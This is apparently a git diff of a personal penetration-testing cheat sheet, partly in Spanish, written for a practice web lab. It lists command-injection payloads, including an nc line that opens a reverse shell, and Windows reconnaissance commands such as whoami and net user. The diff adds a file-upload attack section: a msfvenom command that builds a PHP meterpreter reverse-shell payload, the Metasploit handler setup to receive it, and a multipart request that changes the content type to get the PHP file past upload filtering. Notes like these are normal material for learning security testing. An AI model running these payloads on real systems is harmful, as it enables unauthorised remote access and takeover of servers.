@@ -2138,10 +2138,13 @@ Interesting URL:
 - 127.0.0.1 ; ls
 - 127.0.0.1 | ls
 - 127.0.0.1 && nc -c sh 127.0.0.1 9001
+- grep . text.txt
+- grep -R .
+- python3 --version
 
 ## <span style="color: #3498db; font-size: 0.8em;"> command injection Windows </span>
 
--intental poner en algunos casos | primero ejemplo |hostname o | hostname 
+-intentar poner en algunos casos | primero ejemplo |hostname o | hostname 
 - hostname
 - whoami
 - tasklist
@@ -2153,3 +2156,23 @@ Interesting URL:
 - net user test     //to view the details of the user
 - dir c:\ "pin.txt" or this command ! Take pin.txt   //to get content
 - type c:\"pin.txt“   //to get the content of a file
+
+## <span style="color: #3498db; font-size: 0.8em;"> upload files attack </span>
+> Crear payload en exploit.php para subir al sitio web victima 
+- msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1  LPORT=4444 -f raw >exploit.php
+> Now run Metasploit and start a multi‐handler to listen to PHP reverse sessions.
+- `msfconsole`
+- `>use exploit/multi/handler`
+- `>set payload php/meterpreter/reverse_tcp`
+- `>options`
+- `>set LHOST 192.168.*.*`
+- `>run`
+> subir el archivo y buscar la ruta para ejecutarlo en el navegador y validar en la consola de meterpreter la conexión
+
+
+ >Medium
+ - `100000
+------WebKitFormBoundary12ZF6IVGPcAUFBR4
+Content-Disposition: form-data; name="uploaded"; filename="exploit.php"
+Content-Type: application/x-php`
+- replace image/jpeg
